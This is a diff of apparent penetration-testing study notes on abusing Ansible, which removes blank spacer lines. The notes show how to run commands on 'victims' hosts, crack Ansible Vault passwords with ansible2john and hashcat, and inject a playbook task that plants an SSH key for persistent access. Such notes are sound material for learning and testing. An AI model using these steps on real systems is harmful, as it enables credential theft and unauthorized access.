@@ -15,13 +15,11 @@ From the command machine:
 {% highlight shell %}
 ansible victims -a "whoami"
 {% endhighlight %}
-&nbsp;
 This will run _whoami_ on all members of the Ansible group. To run it as root <span style="color:red">ansible victims -a "whoami" --become</span> or specify the user <span style="color:red">ansible victims -a "whoami" --become user2</span>.
 
 #### Playbooks
 Sets of tasks written in YAML to be scripted so that they can be run in a routine.
 Check this files in <span style="color:red">/opt/playbooks</span> to see if there's any info leakage.
-&nbsp;
 I.E.
 {% highlight yaml %}
 - name: Write a file as offsec
@@ -39,7 +37,6 @@ I.E.
           owner: offsec
           group: offsec
 {% endhighlight %}
-&nbsp;
 Ansible has a new features called _Ansible Vault_ to securely store credentials for playbooks:
 {% highlight yaml %}
 ansible_become_pass: !vault |
@@ -50,17 +47,14 @@ ansible_become_pass: !vault |
           3132313130313534300a383762366333303666363165383962356335383662643765313832663238
           3036
 {% endhighlight %}
-&nbsp;
 Copy the hash starting with "$ANSIBLE_VAULT......." and use <span style="color:red">ansible2john</span> to convert it in a crackable way to then:
 {% highlight shell %}
 hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
 {% endhighlight %}
-&nbsp;
 to then decrypt the vault like:
 {% highlight shell %}
 cat pw.txt | ansible-vault decrypt
 {% endhighlight %}
-&nbsp;
 Also, if the playbook files used on the controller have world-writable permissions or if we can find a way to write to them (perhaps through an exploit), we can inject tasks that will then be run the next time the playbook is run.
 I.E. to add to the yaml playbook:
 {% highlight yaml %}
@@ -86,5 +80,4 @@ I.E. to add to the yaml playbook:
         line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
         insertbefore: EOF
 {% endhighlight %}
-&nbsp;
 Also, some modules from Ansible might leak data in <span style="color:red">/var/log/syslog</span> (I.E. shell module)
